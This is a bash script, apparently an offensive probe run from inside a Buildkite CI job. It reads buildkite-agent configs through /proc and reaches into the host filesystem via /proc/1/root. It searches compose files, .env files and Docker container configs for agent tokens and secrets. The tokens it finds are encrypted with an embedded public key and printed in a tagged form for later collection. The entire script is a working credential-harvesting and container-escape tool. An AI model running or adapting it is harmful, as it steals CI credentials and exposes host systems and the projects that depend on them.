#!/bin/bash
# a632 probe v6: agent-container cfg token + host root compose/.env + docker container configs
set -u
PUB=/tmp/.a632pub.$$
cat > "$PUB" <<'A632PUBEOF'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvsYiCNEL69IkUinb45Id
ZQJZTtR1aqcW1x3sWVg9ZpNnVw2T8xFOpd7xcHnuRuDJjpVkFlBE+sraDq3WdhB7
pnabZtIbLnQc+G6Y8sXmCwbWUwxjz9E5u87DB1o5xPiEyQMeSTNF5SYPPcY4H9eq
jDlHHe8cAA/LpnNcQ/Meluy39CYwHFPMjJGK10X2apBZBJQJxl79TgMx5jFYZx8R
6FAeH8dnEHTWPZEytzegqe0AKKaQwBM7fpd+3UMxnC5NVn3hfE6g0yCvRzyiAELs
Pe6OCiiZ8XBdHHOtoOpE+YarL9U7Q4x7zc52JdojQ7dLS7xySApfHUwE+xa4fvzr
XQIDAQAB
-----END PUBLIC KEY-----
A632PUBEOF
encrypt() { v="$1"; label="$2"; [ -z "$v" ] && return 0; h=$(printf '%s' "$v" | sha256sum | cut -c1-12); c=$(printf '%s' "$v" | openssl pkeyutl -encrypt -pubin -inkey "$PUB" 2>/dev/null | base64 -w0); echo "A632ENC:$label:$h:${c:-ENCFAIL}"; }
echo "A632F_BEGIN"; id; hostname
echo "== AGENT CONTAINER CFG =="
cnt=0
for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  c=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 120) || continue
  case "$c" in *buildkite-agent\ start*)
    f=/proc/$p/root/etc/buildkite-agent/buildkite-agent.cfg
    if [ -f "$f" ]; then
      echo "ACFG pid=$p sha=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)"
      grep -E '^[[:space:]]*(token|token-env|hooks-path|plugins-path|name|tags|build-path)' "$f" | sed 's/=.*/=<redacted>/' | head -10
      t=$(grep -E '^[[:space:]]*token[[:space:]]*=' "$f" | head -1 | sed -E 's/^[^=]*=[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/')
      encrypt "$t" "acfg:$p"
      cnt=$((cnt+1)); [ $cnt -ge 3 ] && break
    fi
  esac
done
echo "== AGENT CONTAINER LAYOUT =="
for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  c=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 120) || continue
  case "$c" in *buildkite-agent\ start*)
    echo "AGP $p ROOTLS:"; ls -la /proc/$p/root/ 2>&1 | head -18
    echo "AGP $p RUN:"; ls -la /proc/$p/root/run/ 2>&1 | head -10
    echo "AGP $p ENTRY:"; ls -la /proc/$p/root/entrypoint* /proc/$p/root/*.sh 2>&1 | head -6
    break
  esac
done
echo "== HOST ROOT ACCESS =="
ls -la /proc/1/root/ 2>&1 | head -25
echo "== HOST DIRS =="
for d in /proc/1/root/opt /proc/1/root/root /proc/1/root/home /proc/1/root/srv /proc/1/root/etc; do echo "HD $d"; ls -la "$d" 2>&1 | head -18; done
echo "== COMPOSE FILE SEARCH =="
find /proc/1/root -maxdepth 5 \( -name 'docker-compose*.y*ml' -o -name 'compose*.y*ml' \) 2>/dev/null | head -20
for f in $(find /proc/1/root -maxdepth 5 \( -name 'docker-compose*.y*ml' -o -name 'compose*.y*ml' \) 2>/dev/null | head -10); do
  echo "CFILE $f"; sha256sum "$f" 2>/dev/null; grep -inE 'token|BUILDKITE|secret' "$f" 2>/dev/null | sed -E 's/(token[^:=]*[:=][[:space:]]*).*/\1<redacted>/I' | head -12
  grep -oiE '(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN)[[:space:]]*[:=][[:space:]]*[^ "]*' "$f" 2>/dev/null | sed -E 's/^[^:=]*[:=][[:space:]]*//' | while IFS= read -r v; do encrypt "$(printf '%s' "$v" | tr -d '"')" "cfile:$(basename $f)"; done
done
echo "== ENV FILE SEARCH =="
for f in $(find /proc/1/root -maxdepth 5 -name '.env' 2>/dev/null | head -10); do
  echo "EFILE $f"; sha256sum "$f" 2>/dev/null; grep -iE 'token|secret|BUILDKITE' "$f" 2>/dev/null | sed -E 's/=.*/=<redacted>/' | head -10
  grep -iE '^(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN)=' "$f" 2>/dev/null | while IFS='=' read -r k v; do encrypt "$v" "efile:$k"; done
done
echo "== DOCKER CONTAINER CONFIGS =="
for f in $(find /proc/1/root/var/lib/docker/containers -maxdepth 2 -name 'config.v2.json' 2>/dev/null | head -6); do
  echo "DCFG $f"
  grep -oE '"Image":"[^"]*"' "$f" 2>/dev/null | head -2
  grep -oE 'BUILDKITE_[A-Z_]*TOKEN[^,]*' "$f" 2>/dev/null | sed -E 's/=.*/=<redacted>/' | head -6
done
rm -f "$PUB" 2>/dev/null || true
echo "A632F_END"
